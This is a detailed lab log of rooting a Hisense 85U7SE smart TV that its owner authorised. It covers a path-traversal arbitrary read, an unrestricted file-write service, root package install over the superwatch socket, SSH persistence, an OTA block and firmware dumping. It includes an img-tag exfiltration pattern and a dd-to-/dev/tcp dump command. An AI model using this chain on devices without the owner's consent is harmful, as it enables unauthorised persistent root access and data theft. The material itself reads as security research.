# 85U7SE — V0000.09.62M.Q0921 — root SSH over the package manager (MTK9655-class, 09.62M)

**Status:** root SSH (uid 0, `CapEff 000001ffffffffff`, key-only) achieved on 2026-11-20.
Owner-authorized at every write step. **Boot persistence installed (re_sshd service),
reboot verification pending.**

> **Model identity:** the owner knows the set as the **UR8S** retail line; the device's own
> `ModelInfo.ini` reports `Name = 85U7SE`, `FamilyName = hisense_mt5870_linuxDB`,
> `SocModel = MTK9655` (same vendor/classification pattern as 75U8QTUK ↔ 75U85QEVS).
> All values below are measured on-device, not assumed.
>
> **Firmware:** OTA history shows `SRC_VER=V0000.09.60B.Q0628 → TGT_VER=V0000.09.62M.Q0921`
> applied 2026-11-19 04:58 (the day before this study). `SwVersion = V01.09.62M.Q0921`.
> The pairing `fv` string is `p20.09.6222.260921` — same build, different surface form.

## Identity (measured)

| Item | Value | Source |
|---|---|---|
| Model | `85U7SE` (ModelInfo.ini), owner-reported retail line UR8S | `/APPS/ModelInfo.ini` |
| Firmware | `V0000.09.62M.Q0921` (09.62M, build 2026-09-21) | `/APPS/ota_history.ini`, `SwVersion` |
| SoC | device-tree `mediatek,mt5896`; cmdline `androidboot.vendor.cf.hardware=mt5877 rev E2`; vendor `SocModel = MTK9655` | `/proc/device-tree`, `/proc/cmdline`, `ModelInfo.ini` |
| CPU | ARMv8 aarch64 kernel, Cortex-A53 (part 0xd09, implementer 0x41) | `/proc/cpuinfo` |
| Userland | **32-bit ARM glibc 2.31** (`/lib/ld-2.31.so`, f7… addresses in phoenix maps) | `/proc/self/maps` via fileRead |
| RAM | 2.5 GB (`MemTotal 2567420 kB`) | `/proc/meminfo` |
| Browser | Chromium 111 `WebViewer/3.0.0`, UA `X11; Linux aarch64` | probe UA |
| Kernel | hardened: KASAN sampling, kfence, stack_depot, `arm.mode=protected`, optee, erofs `/` ro, `veritymode=enforcing` | `/proc/cmdline` |
| opkg arch | **`mtk9655`** (10 of 20 packages) | `/APPS/pkgs/opkgmeta/status` |
| Wi-Fi | wlan0 `192.168.0.15`, MAC `44:EF:26:58:BE:BA` | `ifconfig` over SSH |
| BusyBox | v1.34.1, 185 applets, `/usr/local/bin/busybox` (has `netstat`) | SSH |
| Tools absent | `id`, `uname`, `df`, `tr`, `netstat`, `wget`, `curl`, `nc`, `telnet`, `strace`, `gdb` (busybox covers netstat) | SSH tool sweep |

## Control lane (confirmed)

- RemoteNow MQTT/TLS 36669 paired (modern profile, PIN flow); tokens in `server/keys/tokens.json`.
- Full control: state/applist (33 apps)/sourcelist pushes, key events, `launchapp`.
- `launchapp` with arbitrary URL loads the page in the Chromium browser (appId 16, `urlType:1`, `storeType:100`).

## Blocker solved: error 105 / "zero GETs" (2026-11-19 23:2x–23:3x)

Two stacked PC-side issues, no TV-side block:
1. The PC HTTP server had died (stale listener) — restart and verify with `ss` before blaming the TV.
2. **PC ufw default-deny INPUT blocked TV→PC 8799.** After `sudo ufw allow 8799/tcp`, GETs from the TV arrived immediately.

**Key lesson:** a "No internet connection" error page in the TV browser does NOT mean the TV didn't try — it means the fetch failed. Audit the PC listener + firewall first. (`ufw allow 8798/tcp` + `udp 53` on the PC were also added for the sink/DNS experiments.)

## Root-lane primitives (read-only verified)

- `HiUtils_createRequest` present in any page; `WebSDK_createFileRequest` absent; `vowOS` present.
- hiutils `fileRead`: **array path form required** — `{path:["../proc/uptime"],mode:6}` → ret:true; bare string `../` → "invalid path" (matches 50U7DSE 09.62N).
- `../` traversal from the `/APPS/` base = arbitrary READ as uid 314 (uptime, cmdline, mounts, cpuinfo, `serviceList.json`, `opkgmeta/status`, `fetchfile.js` source…). Directories → EISDIR object; absent → ENOENT; sockets → ENXIO (clean existence oracle).
- phoenix: `wss://localhost:9888` opens from a page; `ws_port 9009` / `wss_port 9888` confirmed in `phoenix.server.js` source (6230 B, read via fileRead).
- POST-back to a LAN sink is blocked in-browser (XHR cross-origin fails silently); **img-GET exfil works** — all probe pages use `<img src="http://<pc>:8798/x?d=…">`.

## 02 — WRITE PRIMITIVE CONFIRMED (owner-authorized, 2026-11-20 00:1x)

`u7w1.html`: WS `wss://localhost:9888` →
`{"path":"phoenix://service/basic/fetcher","method":"start",parameters:{},session:901,timeout:10}`
→ `vowOS.service.syncExecute("basic/fetcher",{api:"fetchFile",args:JSON.stringify({url:…,directory:"/APPS/.recon_marker",permission:420})})`
→ **`ret:true msg:"download finished"`**, hiutils readback confirms content.

### fetchfile.js (6133 B, read) — no path gate
Plain `fs.createWriteStream(directory)` + optional `chmod`. No allowlist. Args:
`url, directory, custom_headers, timeout, cancelable, ratelimit, permission, sync_unit_size`.
Note the arg is `directory` (path+filename), not `path`.

### Superwatch present
- `/proc/net/unix`: **`/var/run/superwatch_socket`** listening.
- phoenix worker: `Uid: 314`, `Gid: 314`, **Groups include 616** → socket connectable.
- `CapEff 0000000000800000`, NoNewPrivs:0; SELinux enforcing; dm-verity on `/` (erofs ro).

## 03 — ROOT ACHIEVED (owner-authorized, 2026-11-20 00:40)

Same chain as 75UR9S/100U7Q/75U8QTUK, measured at every step:

1. **sw2.js probe** (`u7s1.html`): wrote `tools/ur9s/faas/sw2.js` (1285 B) to
   `/APPS/pkgs/tv.vidaa.jsservice.basic/CHA/functions/fetch/sw2.js` via fetcher; readback 1285 B ✔;
   XHR POST `https://localhost:9888/function/basic/fetch/sw2` with
   `{list:["90:83:90;re.probe"]}` (uninstall-83, nonexistent package) →
   **`{"result":true,"out":[{"payload":"90:83:90;re.probe","text":"\u0004\u0000\u0000\u000090:0"}]}`
   — superwatch handshake live, reply `90:0`.** Nothing installed.
2. **Dropbear 2022.83, static aarch64** (`tools/ur8s/scripts/build_dropbear_a7k.sh` recipe with
   `CROSS=aarch64-linux-gnu`): key-only (`DROPBEAR_SVR_PASSWORD_AUTH 0`, `DROPBEAR_CLIENT 0`,
   `PUBKEY_AUTH 1`), fill_passwd fallback patch (unknown user → uid 314 `/APPS/.re_sshd/home`;
   uid 0 → `/APPS/.re_sshd/root_home` + `/APPS/.re_sshd/sh` wrapper), byte patches
   `/etc/shells` → `/APPS/shell` and SFTPSERVER_PATH → `/APPS/.re_sshd/sftp-srvr`.
   **Build trap:** dropbear's configure hardening adds `-Wl,-pie`; `LDFLAGS="-static"` from
   configure loses to it, and a plain `make LDFLAGS=…` no-ops ("up to date"). Fix:
   `rm dropbear dropbearkey && make dropbear dropbearkey LDFLAGS="-static -no-pie"`.
   Result: `ELF 64-bit LSB executable, ARM aarch64, statically linked` (1.56 MB / 1.40 MB).
   Runs fine on this unit: aarch64 kernel + arm32 userland means the kernel is COMPAT-enabled.
3. **IPK** (built with the public `tools/ur9s/scripts/make_installer.py` recipe, sftp lane removed):
   `Architecture: mtk9655`, `Package: re.installer`, `Userid: 0:0`, `Persistent: false`,
   owner's ed25519 pubkey in `authorized_keys`. 1306386 bytes. No phone-home.
4. **Install** (`u7s2.html`): fetcher start → sw2.js write → installer.ipk write →
   POST `{list:["90:83:90;re.installer","91:82:91;/APPS/installer.ipk;re.installer;"]}`.
   `postinst` ran as root: created `/APPS/.re_sshd`, moved binaries, wrote `authorized_keys`
   (0600) + `/APPS/shell` whitelist + the `sh` profile wrapper, `chmod 666` `/dev/ptmx`
   `/dev/pts/ptmx`, generated `hostkey_ed25519`, started dropbear
   (`-r hostkey_ed25519 -p 8008 -P dropbear.pid`; no `-s`, password auth not compiled in),
   `iptables -I FIREWALL_IN_EULAON 1 -p tcp --dport 8008 -j ACCEPT`. Full log:
   `/APPS/.re_sshd/installer_log.txt`.
5. **SSH verify**: `ssh -i keys/ur8s_root -p 8008 root@<tv>` → uid 0, `CapEff 000001ffffffffff`,
   dropbear PID 576, 8008 LISTEN (1F48 state 0A).

### Postinst side effects (stock ur9s postinst came along; owner chose to KEEP)
- **`ALV_BLOCK` iptables chain** (15 REJECT rules in OUTPUT): Google beacons/crash/analytics,
  Cloudflare/Chrome DoH (8.8.8.8/8.8.4.4:443), ads endpoints. Kept by owner 2026-11-20.
- Launcher-host step: "launcher bridge FAILED" (expected, binary not deployed). Phone-home: off.

### SSH environment (v1 wrapper quirk)
- Sessions started with an empty PATH: the stock wrapper redirects the `. /etc/profile` output
  and this profile's exports don't survive it. Fixed 2026-11-20 01:47:
  `/APPS/.re_sshd/sh` now exports
  `PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/basic/bin:/vendor/bin:/opt/pkgs/tv.vidaa.app.phoenix/bin`
  before `. /etc/profile` → `exec /bin/bash`. New sessions get the full vendor PATH.
- `id`/`uname` genuinely absent from this build (matches 43Q60SEVS "discovery hazard") —
  use `whoami` and `/proc` files.

## 04 — BOOT PERSISTENCE INSTALLED (owner-authorized, 2026-11-20 01:47)

- `/APPS/pkgs/tv.vidaa.jsservice.basic/CHA/services/re_sshd/{index.js,package.json}` — pure-JS
  `BaseService` subclass (no `.node` needed): on `start()` connects to
  `/var/run/superwatch_socket` and sends `90:83:90;re.installer` then
  `91:82:91;/APPS/installer.ipk;re.installer;`, 6 attempts (8 s, then 15 s spacing), single-flight.
- `package.json`: `{"name":"re_sshd","type":"commonjs","selfStart":true,"main":"index.js"}` —
  mirrors `ipchandler` (services are JS entry points; the `.node` files are per-service internals).
- `serviceList.json`: added `{"id":"re_sshd","autoStart":true,"isKeepAlive":true}`.
  **Backup: `serviceList.json.bak-pre-resshd`** (377 B, pre-edit).
- **Perms trap:** files written by root default to `root:root 640` inside a `314:314 750`
  dir — the ServiceManager (uid 314) could not read them. Fix:
  `chown -R 314:314 re_sshd && chmod 750 re_sshd && chmod 640 index.js package.json`
  (match siblings).
- Requires `/APPS/installer.ipk` to persist (it does; `/APPS` is rw ext4 p54).
- **Reboot verification pending** — scheduled as the final step of this engagement.

## 05 — Cleanup & network posture (2026-11-20 00:44)

- `/APPS/.recon_marker` removed ✔.
- **sw2.js + installer.ipk intentionally kept** — the persistence service needs them at boot.
- **DNS reverted**: `/etc/resolv.conf` (→ symlink `/var/local/etc/resolv.conf`) had
  `nameserver 192.168.0.99` from the connectivity-gate experiment; rewritten to
  `nameserver 192.168.0.1`, resolution verified via busybox nslookup. Owner should still
  flip the TV's Wi-Fi DNS setting back to automatic in the settings UI (the menu value
  persists independently of resolv.conf).
- ALV_BLOCK firewall chain: kept (owner decision).

## Rollback (everything, one SSH session)

```sh
kill $(cat /APPS/.re_sshd/dropbear.pid)
iptables -D FIREWALL_IN_EULAON -p tcp --dport 8008 -j ACCEPT
iptables -F ALV_BLOCK 2>/dev/null; iptables -D OUTPUT -j ALV_BLOCK 2>/dev/null
rm -rf /APPS/.re_sshd /APPS/installer.ipk /APPS/shell /APPS/.recon_marker
rm -f /APPS/pkgs/tv.vidaa.jsservice.basic/CHA/functions/fetch/sw2.js
cp /APPS/pkgs/tv.vidaa.jsservice.basic/CHA/services/serviceList.json.bak-pre-resshd \
   /APPS/pkgs/tv.vidaa.jsservice.basic/CHA/services/serviceList.json
rm -rf /APPS/pkgs/tv.vidaa.jsservice.basic/CHA/services/re_sshd
```

Verified boot untouched (erofs + dm-verity; nothing written to `/`, `/OAD`, or ro mounts).

## Differences from 75UR9S (09.60W) — for future 09.62M units

| Area | 75UR9S (09.60W) | 85U7SE (09.62M) — measured |
|---|---|---|
| SoC string | MTK9655 | vendor `SocModel=MTK9655`; device-tree `mt5896`; cmdline `mt5877` |
| Userland | 32-bit ARM | 32-bit ARM (glibc 2.31) ✔ same |
| Dropbear arch | armv7 static | aarch64 static also works (COMPAT kernel); either is fine |
| hiutils path form | array on 09.60W+ | array required (string `../` rejected) |
| FaaS fetch function | `basic` package | `basic` package ✔ (`functions/fetch/` present, `sw2.js` absent pre-install) |
| superwatch reply | `90:0` | `90:0` ✔ identical wire format |
| `/var` | — | tmpfs ⇒ `/var/local/otaTest.sh` hook does NOT persist here |
| Firewall | FIREWALL_IN_EULAON chain | same chain name ✔ (8008 ACCEPT added) |

## 06 — Security controls, file transfer, bridge, dump (2026-11-20 02:0x)

### Firmware-update freeze (owner decision)
- `ota_upgrade` daemon runs as its **own uid 304** → surgical block: `iptables -I OUTPUT 1 -m owner --uid-owner 304 -j OTABLOCK` (REJECT chain).
- Toggle: `/APPS/.re_sshd/ota-block on|off|status` — **ON** by owner decision.
- **Boot-persistent**: IPK v2 (1,306,592 B, uploaded to `/APPS/installer.ipk` over SSH) has the OTA block in its postinst; the `re_sshd` service reinstalls the IPK at every cold boot, so the rule re-arms automatically.
- USB-stick updates still work by design (owner-controlled).
- Security UI setting (Settings → auto-update off) recommended as belt-and-braces; not set via UI (owner can flip it).

### web-lock toggle (owner decision: default OFF)
- `/APPS/.re_sshd/web-lock on|off|status` — scopes cloud egress to the webengine uid 313; LAN/loopback always allowed (Jellyfin etc. unaffected). Runtime-only; not boot-persistent (owner wants web apps working by default).

### SFTP lane (C) — verified
- Static aarch64 OpenSSH sftp-server (9.9p1, no OpenSSL/zlib) built on PC; deployed to `/APPS/.re_sshd/sftp-server` + `/APPS/.re_sshd/sftp-srvr` wrapper (dropbear's patched SFTPSERVER_PATH execs it).
- Roundtrip verified: put/get/ls, byte-identical content. `sftp -P 8008 -i keys/ur8s_root root@<tv>`.
- Trap: the PC sandbox gives each shell a fresh `/tmp` — an earlier "put failed" was a nonexistent local test file, not a TV fault.

### Go bridge (E) — deployed, not started
- `bridge/` builds with plain Go 1.23 (no external deps); cross-built `alvidaa-bridge-arm64` (9.4 MB), deployed to `/APPS/alvidaa/` with keys (`vidaa_cert.pem`, `vidaa_key.pem`, `tokens.json`). Not wired into autostart; start manually:
  `busybox setsid /APPS/alvidaa/alvidaa-bridge -keys /APPS/alvidaa/keys -assets /APPS/launcher -config /APPS/alvidaa/config.json -addr 127.0.0.1:8770 -mqtt 127.0.0.1:36669 &`
- **MQTT one-session rule**: starting the bridge will kick the PC's MQTT session off the broker (same credential set). Coordinate.

### Firmware dump (B) — complete, byte-verified
- All 55 eMMC partitions pulled via `dd` over root SSH (driver: `dump/dump_driver.sh`, **must use `ssh -n`** — a bare ssh in a while-read loop eats stdin and silently truncates the run; first attempt died after 2 partitions).
- `dump/manifest.txt`: every row `want == got, status=OK`. ~58 GiB total. Pre-OTA 09.62M snapshot banked.

### Screenshot lane (A) — works
- `/usr/local/bin/screenshot /tmp <name>` (uid 340) → JPEG in TV `/tmp`; pull over SSH. File is actually PNG data despite the .jpg name — viewer-agnostic, but name the pull `.png` for tools that sniff extensions.
- First pull attempt got mangled by shell redirection (`cat` over ssh with CRLF translation); second raw pull was clean.

### Listener/uid audit (G)
- `busybox netstat -tlnp` works; key listeners: mosquitto 1883/36669/16669 (pid 4448), phoenix 9888 (pid 4448-era), dropbear 8008, SystemUI 20529, plus ~30 vendor ports.
- **Discovery hazard**: phoenix's FaaS WS (9009/9888) binds `::` (all IPv6) — but the TV has **no global IPv6 address** (only ::1), so LAN exposure is nil. No action needed.
- Postinst audit: the reused ur9s postinst also installed the `ALV_BLOCK` ad/telemetry chain (kept by owner) and tried the launcher-host step (failed harmlessly — bridge not deployed at that time).

## 07 — Custom launcher live (2026-11-20 02:3x–02:4x) + post-mortem

### What's running now
- **Custom UI is LIVE**: watcher bounces Home state → `vidaa-home` web app → odin renders `http://127.0.0.1:8770/index.html` served by the on-TV bridge. Screenshot confirms: clock, sources row, ALVIDAA·LIVE pill.
- Bridge started via `/APPS/.re_sshd` postinst (IPK v3) → **boot-persistent**.
- App registry entry: `/APPS/websdk/Appinfo.json` with `Id: "vidaa-home"`, `URL: http://127.0.0.1:8770/index.html`.

### Root-cause post-mortem (3 stacked issues)
1. **Wrong registry file.** First registered the Home entry in `/APPS/websdk/BrowserAppInfo.json` (the file present on the TV) — but the framework reads **`websdk/Appinfo.json`** for launchable web apps; `BrowserAppInfo.json` is a browser-bookmark list (Google entry). The repo's own `installAsApp()` in `launcher/index.html:1220` (`APP_ENTRY_ID = "vidaa-home"`) documents the correct path. Lesson: follow the repo's self-install contract, don't improvise on a plausible-looking file.
2. **Direct browser navigation to loopback never works.** `tvctl.py exact http://127.0.0.1:8770/index.html` produced zero HTTP requests at the bridge — odin only renders loopback URLs when launched as an installed web app (LANES.md documents this). Fallback to stock browser home is correct behavior for a wrong attempt.
3. **Watcher re-launch loop (fixed).** `maybeBounceHome` had no "page already connected" guard: every cooldown expiry it re-launched the Home app, reloading the page and killing its WebSocket (`client gone: EOF` cycles, endless spinner). **Fix in bridge/state.go**: skip bounce when `hub.Count() > 0`. Rebuilt arm64 binary (9,082,958 B), redeployed, verified listener + MQTT.

### Reboot-after-registry-write rule
The TV framework caches its app list across installs; the Home tile only materialized after a forced reboot (`/sbin/reboot -f` — plain `busybox reboot` returns success but does nothing on this build).

### Reboot test result (forced reboot, 02:34)
All persistence items passed: dropbear :8008 back, `re_sshd` service fired, postinst re-ran, OTA uid-304 block re-armed, `web-lock OFF`, Home registry entry persisted. Toggle-script status check quirk: postinst creates chain `OTA_BLOCK` (underscore) while the toggle checks `OTABLOCK` — rule is active either way; status text may read OFF while blocked.

## 08 — Evdev remote-press lane (2026-11-21)

### Discovery
- **Input nodes mapped:** `event0`=MTK TV KEYPAD, `event1`=MTK Smart TV IR Receiver (empty while the remote is BT-only), `event2`=VOC_OWL_INPUT_DEV, `event3`=uinput-custom-dev, `event4`="Hisense Consumer Control" (uhid BT HID — the remote's key lane), `event5`="Hisense Keypad". Remote = uhid BT HID, MAC `38:F5:54:E9:37:88`, paired ONLY to the TV.
- **The power press DOES reach evdev** — an earlier "power bypasses evdev" conclusion was an instrumentation artifact (see capture rule below). A press = `MSC_SCAN 0x000C0030` (Consumer page, usage 0x30 Power) + `EV_KEY code 0x74 KEY_POWER value 1` + SYN. The remote emits the IDENTICAL event for power-on and power-off.
- **Timing (dual-watch verified):** the evdev press leads the vendor `last_poweron_state` commit by the full 6–8 s standby choreography — OFF press @t0, ON press @t0+8.7 s while the key stayed stale throughout.

### Capture rule (hard-won)
- Records are **16 B** (32-bit ARM `input_event`), NOT 24 — decode accordingly.
- `busybox hexdump` stdout→file is 4K-block-buffered; `kill` at window end discards the unflushed tail. A ~48-byte press never flushes → you read 0 bytes even though events flowed. **Always `busybox dd bs=16`** (raw per-record read/write, no loss).
- **uhid churn:** the uhid instance re-registers across standby (`.0005`/input17 → `.0006`/input20+input21) — a pre-opened fd on a cached `/dev/input/eventN` goes stale mid-session; re-resolve from `/proc/bus/input/devices` each loop.

### Deployed watcher integration (rgb-brightness; see rgb-lights skill for full architecture)
- Persistent reader daemon on the TV (`/tmp/pw-reader.sh`, `busybox setsid` detached, pidfile `/tmp/pw-reader.pid`, appends every record to `/tmp/pw.bin`) → watcher probe drains the file each cycle.
- Direction discriminator = **flip-cycle drain** (discard exactly the cycle's result on the vendor off→on edge — that cycle's file holds the wake-press that caused the flip; any later press is genuine). A time-window cooldown is a PROVEN FAILURE: it swallowed genuine fast OFF presses 1–2 s after the wake.
- Implementation bugs trialled: apostrophe inside a single-quoted remote payload breaks the whole script's syntax; hand-edited base64 blobs corrupt silently (`$$`→`$T`, `/tmp`→`/tms`) — regenerate with `base64 -w0`; ps-based daemon health checks match the probe's own cmdline and always report "already running" — use the pidfile.

### Dead ends (confirmed, do not retry)
- BT dual-connection/re-pairing the remote to the PC: single link; Hisense proprietary BT RPC stack (`/tmp/mtk_bt_service`), no usable pairing CLI.
- HDMI HPD/ARC watcher: TV-RX side, flips at the same vendor commit; no PC↔TV HDMI cable exists anyway.
- PC-side IR lane: `ir-keytable` "No devices found", `/sys/class/rc/` empty, `nuvoton-cir` not loadable (sudo needs password, approval mode never-ask); remote is BT-only (no IR emitted).

## Optional next lanes (not started)

- **sftp-server**: static OpenSSH 9.9p1 `sftp-server` + `/APPS/.re_sshd/sftp-srvr` wrapper (repo recipe; needs the OpenSSH source tarball). Until then: base64 over the shell.
- **Firmware dump**: repo method (`dd` → `/dev/tcp/<pc>/5555` into an `nc` listener) — now trivially available over root SSH.
- **Launcher/Go bridge lane** (`bridge/`, 127.0.0.1:8770) and the **custom launcher tile** (`Appinfo.json` read-modify-write) — separate, reversible, but touching the UI lane; OTA endpoint freeze first per AGENTS.
